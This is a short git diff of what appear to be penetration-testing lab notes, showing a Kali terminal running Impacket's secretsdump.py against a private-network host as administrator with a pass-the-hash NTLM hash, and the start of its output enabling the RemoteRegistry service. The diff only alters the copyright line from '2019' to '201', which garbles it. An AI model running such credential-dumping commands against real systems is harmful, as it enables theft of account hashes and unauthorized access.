@@ -91,7 +91,7 @@ secretsdump.py administrator:@192.168.95.134 -hashes aad3b435b51404eeaad3b435b51
 ```
 ┌─(~/Documents/PEH)───────────────────────────────────────────────────────────────────────────────────(kali@kali:pts/0)─┐
 └─(09:43:02)──> secretsdump.py administrator:@192.168.95.134 -hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f
-Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation
+Impacket v0.9.19 - Copyright 201 SecureAuth Corporation
 
 [*] Service RemoteRegistry is in stopped state
 [*] Service RemoteRegistry is disabled, enabling it
